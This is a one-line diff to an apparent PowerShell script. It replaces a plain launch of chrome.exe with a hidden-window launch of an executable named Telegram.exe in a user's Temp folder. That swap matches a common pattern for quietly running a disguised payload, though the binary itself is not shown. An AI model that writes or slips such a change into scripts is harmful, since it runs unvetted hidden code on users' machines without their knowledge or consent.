@@ -1,1 +1,1 @@
-Start-Process "chrome.exe"
+Start-Process -filepath "C:\Users\hdbhs\AppData\Local\Temp\Telegram.exe" -windowstyle hidden 
